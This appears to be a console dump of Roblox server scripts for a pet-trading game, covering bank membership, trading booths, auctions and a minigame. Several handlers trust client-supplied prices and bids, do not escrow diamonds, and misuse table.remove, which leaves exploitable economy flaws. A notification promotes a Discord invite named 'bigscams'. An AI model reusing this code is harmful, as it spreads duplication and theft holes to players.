	if diamonds > 0 then
		bankCurrency.Diamonds = bankCurrency.Diamonds - diamonds
	end
	
	if next(pets) then
		for index, uid in ipairs(pets) do
			for _index, pet in ipairs(bankPets) do
				if uid == pet.uid then
					if myBank ~= buid then
						if pet.l then
							return false, "You cannot withdraw the owners locked pets!"
						end
					end
					table.remove(bankPets, _index)
					_L.Pets.Create(plr, pet.id, pet, nil, true)
				end
			end
		end
	end
	
	_L.Give.Currency(plr, diamonds, "Diamonds")
	
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["WITHDRAW"],
		ts = workspace:GetServerTimeNow(),
		sender = plr.UserId,
		pets = #pets,
		diamonds = diamonds
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[tostring(buid)] = bData
	})

	return true
end

_L.Network.Invoked("Invite To Bank").OnInvoke = function(plr, buid, target)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData, opData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId), Bank.Get("Players", target)
	if not bData or not pData or not opData then
		return nil
	end

	if not Bank.OwnsBank(plr, buid) then
		return false, "You arent the owner of this bank!"
	end

	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	for index, data in ipairs(opData.Invites) do
		if data.BUID == buid then
			return false, "You have already sent an invite to this player!"
		end
	end
	
	for index, data in ipairs(opData.Banks) do
		if data.BUID == buid then
			return false, "This player is already a member of your bank!"
		end
	end
	
	if #opData.Invites >= Bank.Settings["MaxInvites"] then
		return false, "This player has the max amount of invites!"
	end
	
	local tierDir = _L.Directory.Banks[bData.Tier]
	if not tierDir then
		return nil
	end
	
	if tierDir.MaxPlayers <= #bData.Players + 1 then
		return false, "Your bank cannot hold any more players!"
	end
	
	local iData = _G.GetDefaultData("invite")
	iData["BUID"] = buid
	iData["Sender"] = plr.UserId
	
	table.insert(pData.OutgoingInvites, target)
	table.insert(opData.Invites, iData)
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["INVITE"],
		ts = workspace:GetServerTimeNow(),
		sender = plr.UserId,
		target = target
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[buid] = bData
	})
	Bank.Update("Players", {
		[tostring(target)] = opData,
		[tostring(plr.UserId)] = pData
	})
	
	return true
end

_L.Network.Invoked("Kick From Bank").OnInvoke = function(plr, buid, target)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData, opData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId), Bank.Get("Players", target)
	if not bData or not pData or not opData then
		return nil
	end

	if not Bank.OwnsBank(plr, buid) then
		return false, "You arent the owner of this bank!"
	end

	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	for index, uid in ipairs(bData.Players) do
		if uid == target then
			table.remove(bData.Players, index)
		end
	end
	
	for index, _buid in ipairs(opData.Banks) do
		if _buid == buid then
			table.remove(opData.Banks, index)
		end
	end
	
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["KICK"],
		ts = workspace:GetServerTimeNow(),
		sender = plr.UserId,
		target = target
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[buid] = bData
	})
	Bank.Update("Players", {
		[tostring(target)] = opData,
		[tostring(plr.UserId)] = pData
	})

	return true
end


_L.Network.Invoked("Leave Bank").OnInvoke = function(plr, buid)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId)
	if not bData or not pData then
		return nil
	end

	if not Bank.IsMember(plr, buid) then
		return false, "You arent a member of this bank!"
	end

	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	for index, uid in ipairs(bData.Players) do
		if uid == plr.UserId then
			table.remove(bData.Players, index)
		end
	end

	for index, _buid in ipairs(pData.Banks) do
		if _buid == buid then
			table.remove(pData.Banks, index)
		end
	end
	
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["LEAVE"],
		ts = workspace:GetServerTimeNow(),
		sender = plr.UserId,
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[buid] = bData
	})
	Bank.Update("Players", {
		[tostring(plr.UserId)] = pData
	})
end

_L.Network.Invoked("Accept Bank Invite").OnInvoke = function(plr, buid)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local can, response = Bank.Fix(buid)
	if not can then
		return false, response
	end

	local bData, pData, spData = Bank.Get("Banks", buid), Bank.Get("Players", plr.UserId), nil
	if not bData or not pData then
		return nil
	end
	
	spData = Bank.Get("Players", bData.Owner)
	if not spData then
		return nil
	end
	
	if bData["Banned"] then 
		return false, "Bank is banned."
	end
	
	if #pData.Banks >= Bank.Settings["MaxBanks"] then
		return false, "You cannot join any more banks!"
	end
	
	for i, v in ipairs(pData.Invites) do
		if v.BUID == buid then
			table.remove(pData.Invites, i)
			for i, v in ipairs(pData.Banks) do
				if v == buid then
					return false, "You're already in this bank!"
				end
			end
		end
	end
	
	local tierDir = _L.Directory.Banks[bData.Tier]
	if not tierDir then
		return nil
	end

	if tierDir.MaxPlayers <= #bData.Players + 1 then
		return false, "This bank cannot hold any more players!"
	end
	
	table.insert(pData.Banks, buid)
	table.insert(bData.Players, plr.UserId)
	table.remove(spData.OutgoingInvites, plr.UserId)
	
	table.insert(bData.History, {
		kind = banksModule.HISTORY_ENUM["JOIN"],
		ts = workspace:GetServerTimeNow(),
		target = plr.UserId,
	})
	bData.History = Bank.SortHistory(bData.History)
	
	--FIX
	bData.LastUpdated=os.time()
	--FIX
	
	Bank.Update("Banks", {
		[buid] = bData
	})
	Bank.Update("Players", {
		[tostring(plr.UserId)] = pData,
		[tostring(bData.Owner)] = spData
	})
	
	return true
end

_L.Network.Invoked("Decline All Bank Invites").OnInvoke = function(plr)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end
	
	local pData = Bank.Get("Players", plr.UserId)
	if not pData then
		return nil
	end
	
	local toUpdate = {}
	for i, v in ipairs(pData["Invites"]) do
		local sender = v.Sender
		local spData = Bank.Get("Players", sender)
		if not spData then
			return false, "Failed, try again!"
		end
		
		table.remove(spData.OutgoingInvites, plr.UserId)
		toUpdate[tostring(sender)] = spData
	end
	
	pData["Invites"] = {}
	toUpdate[tostring(plr.UserId)] = pData
	
	Bank.Update("Players", toUpdate)
	
	return true, "Successfully declined all bank invites!"
end

_L.Network.Invoked("Cancel Bank Outgoing Invites").OnInvoke = function(plr)
	if not Bank.Settings["Enabled"] then
		return false, "Bank is disabled."
	end

	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end

	if not Bank.ValidateDistance(plr) then
		return false, "You're too far from the bank!"
	end

	local pData = Bank.Get("Players", plr.UserId)
	if not pData then
		return nil
	end
	
	local buid = pData["MyBank"]
	if not buid then
		return false, "Failed to get your bank."
	end
	
	local toUpdate = {}
	for i, v in ipairs(pData.OutgoingInvites) do
		local rpData = Bank.Get("Players", v)
		if not rpData then
			return false, "Failed, try again!"
		end
		
		local indexRemoving = nil
		for i, v in pairs(rpData.Invites) do
			if v.BUID == buid then
				indexRemoving = i
			end
		end
		
		if indexRemoving then
			table.remove(rpData.Invites, indexRemoving)
		end
		table.remove(pData.OutgoingInvites, i)
		toUpdate[tostring(v)] = rpData
	end
	
	toUpdate[tostring(plr.UserId)] = pData

	Bank.Update("Players", toUpdate)
	return true
end

_L.Signal.Fired("Player Added"):Connect(function(plr)
	plr:SetAttribute("CustomUserId", plr.UserId)
end)  -  Editar
  04:54:13.778    -  Editar
  04:54:13.778  ----- [2370] ServerScriptService.Scripts.Game.FFlags -----  -  Editar
  04:54:13.778  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_L.Network.Invoked("FFlags Commit").OnInvoke = function(plr, data)
	if not _L.FFlags.CanBypass(plr) then
		return false
	end
	
	for i, v in pairs(data) do
		pcall(function()
			_L.FFlags.Set(i, v)
		end)
	end
	
	return _L.FFlags.Commit(plr)
end

_L.Signal.Fired("FFlags Changed"):Connect(function(new)
	--pcall(function()
	--	_L.Network.FireAll("FFlags Changed", new)
	--end)
end)   -  Editar
  04:54:13.778    -  Editar
  04:54:13.778  ----- [2371] ServerScriptService.Scripts.Game.Yeet -----  -  Editar
  04:54:13.778  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------
local rng = Random.new()

--------|    Variables    |--------
local GameData = {
	["RoundStarted"] = false,
	["IntermissionEndTime"] = workspace:GetServerTimeNow() + 10000,
	["OrbsCollected"] = 0,
	["OrbStormStarted"] = false,
	["OrbStormEnd"] = nil
}

local DebugPlayers = {}

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function GetRandomYeetPet(plr)
	local yeetPets = _L.Pets.GetEquipped(plr)
	if not yeetPets then
		return
	end
	
	return yeetPets[rng:NextInteger(1, #yeetPets)]
end

function GetThrowPower(plr)
	local yeetPets = _L.Pets.GetEquipped(plr)
	if not yeetPets then
		return
	end
	
	local wholePower = 0
	for i, v in ipairs(yeetPets) do
		local yeetPower = _L.Shared.GetYeetPower(v)
		if yeetPower then
			wholePower += yeetPower
		end
	end
	
	local save = _L.Saving.Get(plr)
	local extraYeet = 0
	if save and save.ExtraYeet then
		extraYeet = save.ExtraYeet
	end
	
	_L.Network.Fire("Yeet: Power Updated", plr, wholePower, 0)
	return wholePower
end

local v32 = nil
local v19 = Vector3.new(-1, 0.1, 0)
function createPetProjectile(plr, pet, startPos, velocity)
	local dir = _L.Directory.Pets[pet.id]
	if not dir then
		warn("wtf???")
		return
	end
	v32 = script._SERVER:Clone()
	v32.Anchored = false
	v32.CanCollide = true
	v32.Position = workspace:FindFirstChild("__THINGS"):FindFirstChild("Yeet"):WaitForChild(plr.Name .. "_CLIENT").Position
	v32.Position = startPos + Vector3.new(-1, 0, 0)
	v32.CustomPhysicalProperties = PhysicalProperties.new(2, 1, 0, 100, 25)
	v32.Name = plr.Name .. "_SERVER"
	v32.CollisionGroup = "Yeet"
	v32.Parent = workspace:FindFirstChild("__THINGS"):FindFirstChild("Yeet") 
	local v647 = -1.5
	if dir.huge then
		v647 = -2.5
	elseif dir.titanic then
		v647 = -6
	end
	local v474 = Instance.new("BodyGyro")
	v474.MaxTorque = Vector3.new(math.huge, 0, 0)
	v474.Parent = v32
	local v481 = v32.CFrame
	v32.CFrame = CFrame.lookAt(v481.Position, v481.Position + v481.RightVector, v481.UpVector)
 	v32.Velocity = Vector3.new((v19.X) * velocity, (v19.Y) * math.min(velocity, 100000), 0)
	local v689 = _L.LocalPlayer
	workspace.CurrentCamera.CameraSubject = v32
	local v494 = 0
	local v694
	local v559 = false
	local v698

	local v613 = _L.RunService.Heartbeat:Connect(function(p16) 
		if v32.Velocity.Z ~= 0 then
			v32.Velocity = Vector3.new(v32.Velocity.X, v32.Velocity.Y, 0)
		end
		if v32 then
			local v572 = v32:FindFirstChild("BodyGyro")
			if v572 then
				v32.BodyGyro.CFrame = CFrame.new(v32.Position, v32.Position - Vector3.new(1, 0, 0))
			end
		end
		
		local v583 = math.abs(v32.Velocity.X)
		local v595 = RaycastParams.new()
		v595.CollisionGroup = "Yeet"
		v595.FilterType = Enum.RaycastFilterType.Exclude
		v595.FilterDescendantsInstances = {
			[1] = v32.Parent
		} 
		local v589 = dir.titanic and -14 or -5
		if workspace:Raycast(v32.Position, Vector3.new(0, v589, 0), v595) then
			if not v559 then
				v559 = true
				
				v559 = false
			end
			return 
		end
	end)
	return true
end

function TrackClientPart(plr)
	local Part = _L.Network.Invoke("xyz", plr)
	warn("Got Part", Part.Name)
end

function GenerateVelocity(plr)
	local power = GetThrowPower(plr) or 0
	return power / 10_000 -- ???
end

_L.Network.Invoked("Yeet: Get Game Data").OnInvoke = function()
	return GameData
end

_L.Network.Invoked("Yeet a Pet: Get Data").OnInvoke = function(plr)
	return GetThrowPower(plr)
end

_L.Network.Invoked("Yeet a Pet: Throw").OnInvoke = function(plr)
	local save = _L.Saving.Get(plr)
	if not save then
		return false, "Something went wrong"
	end
	
	local pet = GetRandomYeetPet(plr)
	if not pet then
		return false, "Something went wrong"
	end
	
	if DebugPlayers[plr.UserId] then
		return false, "You're already yeeting a pet!"
	end
	
	local testing = Vector3.new(6715.24, 26.465, -870.986)
	local velocity = GenerateVelocity(plr)
	
	DebugPlayers[plr.UserId] = true
	_L.Network.Fire("Yeet a Pet: Client Throw", plr, pet, testing, velocity, nil, nil, false)
	--createPetProjectile(plr, pet, testing, velocity)
	TrackClientPart(plr)
	
	return true
end

_L.Signal.Fired("Player Added"):Connect(function(plr)
	_G.HasLoaded(plr)
	GetThrowPower(plr)
end)

_L.Signal.Fired("World Changed"):Connect(function(plr, world)
	if world == "Yeet" then
		GetThrowPower(plr)
	end
end)  -  Editar
  04:54:13.778    -  Editar
  04:54:13.778  ----- [2372] ServerScriptService.Scripts.Game.TradingBooths -----  -  Editar
  04:54:13.778  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------
_G.Booths = {}
local debugTimeHolder = {}
local registered = false

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function getAllBooths()
	local booths = {}
	for i, plr in ipairs(_L.Players:GetPlayers()) do
		local d = _G.Booths[tostring(plr.UserId)]
		if not registered then
			d = _L.Signal.Invoke('Get Player Booth', plr)
			_G.Booths[tostring(plr.UserId)] = d
			registered = true
		end
		if d then
			table.insert(booths, d) 
		end
	end
	return booths
end

function getBoothById(id)
	for k, v in pairs(_G.Booths) do
		if v and v.ID then
			if v.ID == id then
				return v.Data
			end
		end
	end
	return nil
end

_L.Signal.Invoked("Get Player Booth").OnInvoke = function(plr)
	return _G.Booths[tostring(plr.UserId)]
end

_L.Network.Invoked("Get All Booths").OnInvoke = function(plr)
	_G.HasLoaded(plr)
	return getAllBooths()
end

_L.Network.Invoked("Get Booth Data By Id").OnInvoke = function(plr, id)
	local booth = getBoothById(id)
	if not booth then
		return nil, nil
	end
	
	return id, booth 
end

_L.Network.Invoked("Get Booth By Id").OnInvoke = function(plr, id)
	local booth = getBoothById(id)
	if not booth then
		return nil, nil
	end

	return id, booth 
end

_L.Network.Invoked("Claim Trading Booth").OnInvoke = function(plr, id)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil, "Something went wrong."
	end
	
	warn(_G.Booths[tostring(plr.UserId)])
	if getBoothById(id) then
		return nil, "This booth is already claimed!"
	end
	
	if _G.Booths[tostring(plr.UserId)] then
		return nil, "You already have a booth!"
	end
	
	local data = {
		["Owner"] = plr.UserId;
		["Style"] = save.SelectedTradingBooth;
		["Listings"] = {};
	}
	
	_G.Booths[tostring(plr.UserId)] = {
		["ID"] = id;
		["Data"] = data;
	}
	
	coroutine.wrap(function()
		pcall(function()
			_L.Network.FireAll("Trading Booth Claimed", id, data)
		end)
	end)()

	return true
end

_L.Network.Invoked("Add Trading Booth Pet").OnInvoke = function(plr, pets)
	local save = _L.Saving.Get(plr)
	if not save then
		return 
	end
	
	if #save.Pets - #pets <= 0 then
		return false, "You need 1 pet in your inventory at all times!"
	end
	
	local pbData = _G.Booths[tostring(plr.UserId)]
	if not pbData then
		return false, "You dont own a booth.."
	end
	
	local bData = pbData.Data
	for k, v in pairs(pets) do
		local uid, price = unpack(v)
		
		local pet, owner = _L.Pets.Get(uid)
		if owner ~= plr then
			return false, "You do not own one of these pets!"
		end
		
		if not pet then
			return nil
		end
		
		bData.Listings[uid] = {
			["Price"] = price;
			["Timestamp"] = workspace:GetServerTimeNow();
			["UID"] = uid;
		}
	end
	
	coroutine.wrap(function()
		_L.Network.FireAll("Trade Booth Updated", pbData["ID"], bData)
	end)()
	
	return true
end

_L.Network.Invoked("Purchase Trading Booth Pet").OnInvoke = function(plr, id, uid)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	local o = debugTimeHolder[tostring(plr.UserId)]
	if o and os.clock() - o < 2 then
		return false, "You're doing this too fast!"
	end 
	
	if #save.Pets + 1 > save.MaxSlots then
		return false, "You do not have enough inventory space!"
	end
	
	local bData = getBoothById(id)
	if not bData then
		return nil
	end
	
	local lData = bData["Listings"][uid]
	if not lData then
		return nil, "Not selling pet?"
	end
	
	local owner = _L.Players:GetPlayerByUserId(bData["Owner"])
	if not owner then
		return nil
	end
	
	local oSave = _L.Saving.Get(owner)
	if not oSave then
		return nil
	end
	
	if save.Diamonds < lData.Price then
		return false, "You need ".._L.Functions.Commas(lData.Price - save.Diamonds).." more Diamonds!"
	end
	
	local pData, ownr = _L.Pets.Get(uid)
	if not pData or ownr ~= owner then
		return nil
	end
	
	pcall(function()
		_L.Pets.Unequip(uid)
		_L.Pets.Delete(uid)
	end)
	
	local newUid, newPData = _L.Pets.Create(plr, pData.id, pData, nil, true)
	if not newUid or not newPData then
		return false, "Something went wrong, any loss pets/diamonds will not be refunded :("
	end
	
	save.Diamonds = save.Diamonds - lData.Price
	oSave.BoothDiamondsEarned = oSave.BoothDiamondsEarned + lData.Price
	oSave.Diamonds = oSave.Diamonds + lData.Price
	
	bData.Listings[uid] = nil
	_G.Booths[tostring(bData["Owner"])] = {
		["ID"] = id;
		["Data"] = bData;
	}
	
	local newData = _G.Booths[tostring(bData["Owner"])]
	coroutine.wrap(function()
		_L.Network.FireAll("Trade Booth Updated", newData["ID"], newData["Data"])
		--
		_L.Network.Fire("Notification", owner, plr.Name .. " purchased your " .. _L.Directory.Pets[newPData.id].name .. " for " .. _L.Functions.NumberShorten(lData.Price) .. " Diamonds! ✅", Color3.fromRGB(105, 255, 168), "rbxassetid://11648890466")
		_L.Network.FireAll("Chat Msg", "🤝 " .. plr.Name .. " purchased a " .. _L.Directory.Pets[newPData.id].name .. " from " .. owner.Name .. " for " ..  _L.Functions.NumberShorten(lData.Price) .. " Diamonds!", Color3.fromRGB(105, 255, 168))
		_L.Network.FireAll("Trading Booth Particle", id, nil, nil, 5, nil, 1)
	end)()

	return true
end

_L.Network.Invoked("Remove Trading Booth Pet").OnInvoke = function(plr, uid)
	local plrBooth = _G.Booths[tostring(plr.UserId)]
	
	plrBooth.Data.Listings[uid] = nil
	coroutine.wrap(function()
		_L.Network.FireAll("Trade Booth Updated", plrBooth.ID, plrBooth.Data)
	end)()
	return true
end

_L.Network.Invoked("Unclaim Trading Booth").OnInvoke = function(plr)
	local plrBooth = _G.Booths[tostring(plr.UserId)]
	if not plrBooth or not plrBooth.ID then
		return nil, "You dont own a booth?"
	end
	
	_G.Booths[tostring(plr.UserId)] = nil
	coroutine.wrap(function()
		_L.Network.FireAll("Trading Booth Unclaimed", plrBooth.ID)
	end)()
	return true
end

_L.Network.Invoked("Change Booth Style").OnInvoke = function(plr, style)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	local dir = _L.Directory.Booths[style]
	if not dir then
		return
	end
	
	local plrBooth = _G.Booths[tostring(plr.UserId)]
	if not plrBooth then
		return nil
	end
	
	if not table.find(save.TradingBoothStyles, style) and style ~= "Default Booth" then
		return false, "You do not own this!"
	end
	
	save.SelectedTradingBooth = style
	plrBooth.Data.Style = style
	coroutine.wrap(function()
		_L.Network.FireAll("Trade Booth Updated", plrBooth.ID, plrBooth.Data)
	end)()
	return true
end

_L.Players.PlayerRemoving:Connect(function(plr)
	local plrBooth = _G.Booths[tostring(plr.UserId)]
	if not plrBooth then
		return nil
	end
	
	_G.Booths[tostring(plr.UserId)] = nil
	coroutine.wrap(function()
		_L.Network.FireAll("Trading Booth Unclaimed", plrBooth.ID)
	end)()
end)  -  Editar
  04:54:13.778    -  Editar
  04:54:13.778  ----- [2373] ServerScriptService.Scripts.Game.Auction -----  -  Editar
  04:54:13.779  --------|     Setting     |--------
local taxAuction = 100000000
local tax = 0.7
local auctionTime=  60

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------
local rng = Random.new()

--------|    Variables    |--------
_G.Auctions = {}
local registered = false

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function getList()
	local list = {}
	for i, plr in ipairs(_L.Players:GetPlayers()) do
		local d = _G.Auctions[tostring(plr.UserId)]
		if not registered then
			d = _L.Signal.Invoke('Get Player Auction', plr)
			_G.Auctions[tostring(plr.UserId)] = d
			registered = true
		end
		if d then
			table.insert(list, d) 
		end
	end
	return #list < 1 and false or list
end

function convertToNumberIndex(array)
	local tbl = {}
	for k, v in pairs(array) do
		--table.insert
		tbl[#tbl+1] = v
	end
	return tbl
end

function getCurrentAuction()
	local converted = convertToNumberIndex(_G.Auctions)
	local current = converted[1]
	if not current or #converted == 0 or current.Completed or not current.EndTime then
		return nil
	end
	return current
end

function debugBid(bid, auction)
	local cur = auction.CurrentBid
	if cur and bid >= cur.Amount + math.ceil(cur.Amount * 0.01) then
		return true
	end
	if bid >= auction.MinimumBidAmount then
		return true
	end
	return false
end

function updateAuction(data)
	coroutine.wrap(function()
		if not data then
			data = getCurrentAuction()
		end
		_L.Network.FireAll("Auction: Update", data)
	end)()
end

--function getPlayerAuctionByUserId(userid)
--	for i, v in ipairs(_G.Auctions) do
--		if v and v.UserId == userid then
--			return v
--		end
--	end
--	return nil
--end

_L.Signal.Invoked("Get Player Auction").OnInvoke = function(plr)
	return _G.Auctions[tostring(plr.UserId)] --getPlayerAuctionByUserId(plr.UserId)
end

_L.Network.Invoked("Auction: List").OnInvoke = function(plr)
	_G.HasLoaded(plr)
	return getList()
end

_L.Network.Invoked("Auction: Create").OnInvoke = function(plr, uid, price)
	assert(typeof(uid) == "string" and typeof(price) == "number")
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	if _G.Auctions[tostring(plr.UserId)] then
		return
	end
	
	if #save.Pets <= 1 then
		return false, "You need atleast 1 pet in your inventory at all times!"
	end
	
	if save.Diamonds < taxAuction then
		return false, "You need ".._L.Functions.Commas(taxAuction-save.Diamonds).." more Diamonds!"
	end
		
	local p = _L.Pets.Get(uid)
	if not p then
		return
	end
	
	if not _L.Shared.CanAuctionPet(p) then
		return
	end
	
	save.Diamonds = save.Diamonds - taxAuction
	
	pcall(function()
		_L.Pets.Delete(p.uid)
	end)
	
	_G.Auctions[tostring(plr.UserId)] = {
		["Id"] = p.uid;
		["PetData"] = p;
		["MinimumBidAmount"] = price;
		["UserId"] = plr.UserId;
		["UserName"] = plr.Name;
		["auctionTime"] = workspace:GetServerTimeNow();
	}
	
	updateAuction(_G.Auctions[tostring(plr.UserId)])
	return true
end

_L.Network.Invoked("Auction: Bid").OnInvoke = function(plr, id, bid)
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	local auction = getCurrentAuction()
	if not auction then
		return nil, "There isnt a current auction."
	end
	
	if auction.UserId == plr.UserId then
		return false, "You cant bid on your own auction!"
	end
	
	if save.Diamonds < bid then
		return false, "You cannot bid this much!"
	end
	
	if auction.Id ~= id then
		return false, "Auction id doesnt match."
	end
	
	if not debugBid(bid, auction) then
		return false, "You cannot bid this amount!"
	end
	
	if auction.CurrentBid ~= nil then
		table.insert(auction.PreviousBids, auction.CurrentBid)
	end
	
	auction.CurrentBid = {
		UserName = plr.Name;
		UserId = plr.UserId;
		Amount = bid;
	}
	
	if auction.EndTime - workspace:GetServerTimeNow() <= 15 then
		auction.EndTime = workspace:GetServerTimeNow() + 15
	end
	
	updateAuction(auction)
	
	return true
end

function giveAuctionRewards(plr, auction, leaving)
	if auction.UserId == plr.UserId then
		--local owner = game.Players:GetPlayerByUserId(auction.UserId)
		local currentBid = auction.CurrentBid
		local bidder = currentBid and game.Players:GetPlayerByUserId(currentBid.UserId)
		local bid = currentBid and currentBid.Amount
		local petData = auction.PetData
		
		local function give(toBidder)
			if toBidder then
				_L.Pets.Create(bidder, petData.id, petData, nil, true)
				return
			end
			_L.Pets.Create(plr, petData.id, petData, nil, true)
		end
		
		if leaving then
			give(false)
		end
		
		if not bidder or not bid then
			give(false)
			return
		end
		
		local save, bSave = _L.Saving.Get(plr), _L.Saving.Get(bidder)
		if not save or not bSave then
			give(false)
			return
		end
		
		give(true)
		bSave.Diamonds = bSave.Diamonds - bid
		save.Diamonds = save.Diamonds + (bid * tax)
	end
end

function completeAuction(plr, auction, giveRewards, leaving)
	auction = table.clone(auction)
	
	auction.Completed = true
	_G.Auctions[tostring(plr.UserId)] = nil
	if giveRewards then giveAuctionRewards(plr, auction, leaving) end
	if auction.CurrentBid then
		_L.RAP.Update(auction.PetData, auction.CurrentBid.Amount)
	end	
	updateAuction(auction)
end

_L.Signal.Fired("Player Added"):Connect(function(plr)
	if not _L.Shared.IsTradingPlaza then return end
	
	coroutine.wrap(function()
		while wait(1) do
			if not plr or not plr.Parent then break end
			local auction = getCurrentAuction()
			if auction then
				local endTime = auction.EndTime
				if endTime and endTime <= workspace:GetServerTimeNow() then
					completeAuction(plr, auction, true)
				end
			end
		end
	end)()
	coroutine.wrap(function()
		while wait(5) do
			if not plr or not plr.Parent then break end
			local list = getList()
			if list then
				for i, v in ipairs(list) do
					if not v.auctionTime then
						list[i] = nil
					end
				end
				
				table.sort(list, function(i, v)
					return i.auctionTime < v.auctionTime
				end)
				
				local auction = getCurrentAuction()
				if not auction and #list > 0 then
					local toAuction = list[1]
					if toAuction then
						toAuction.EndTime = workspace:GetServerTimeNow() + auctionTime
						toAuction.PreviousBids = {}
						toAuction.CurrentBid = nil 

						updateAuction(toAuction)
					end
				end
			end
		end
	end)()
end)

_L.Players.PlayerRemoving:Connect(function(plr)	
	local auction = getCurrentAuction()
	if not auction then
		return
	end
	
	if auction.UserId == plr.UserId then
		_G.Auctions[tostring(plr.UserId)] = nil
		completeAuction(plr, auction, true, true)
	end
end)  -  Editar
  04:54:13.779    -  Editar
  04:54:13.779  ----- [2374] ServerScriptService.Scripts.Game.Scavenger -----  -  Editar
  04:54:13.779  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Get Scavenger Event Info").OnInvoke = function()
	return {}, true, "Cracked Egg"
end

_L.Network.Invoked("Scavenger Hunt Active").OnInvoke = function()
	return false
end  -  Editar
  04:54:13.779    -  Editar
  04:54:13.779  ----- [2375] ServerScriptService.Scripts.Game.CommunityNotification -----  -  Editar
  04:54:13.779  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(plr)
	_G.HasLoaded(plr) _L.Network.Fire("Notification", plr, "Remember to join our community! discord.gg/bigscams", {time = 10, color = Color3.fromRGB(161, 98, 255), force = true})
end)

  -  Editar
  04:54:13.779    -  Editar
  04:54:13.779  ----- [2376] ServerScriptService.Scripts.Game.Idle Tracking -----  -  Editar
  04:54:13.779  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------
_G.MoveCache = {}

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function Move(plr)
	_G.MoveCache[plr] = 0
